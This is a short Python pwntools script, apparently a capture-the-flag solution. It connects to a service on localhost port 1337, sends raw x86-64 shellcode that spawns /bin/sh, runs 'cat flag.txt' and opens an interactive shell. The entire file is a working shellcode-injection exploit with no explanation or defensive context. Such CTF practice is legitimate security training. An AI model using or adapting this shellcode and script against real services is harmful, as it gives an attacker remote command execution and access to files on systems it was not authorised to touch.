#!/usr/bin/env python3

from pwn import *

#p = process("./app")
p = remote("localhost", 1337)

payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
log.info(f"Shellcode (len: {len(payload)}): {payload}")

p.sendline(payload)
p.sendline(b"cat flag.txt")
p.interactive()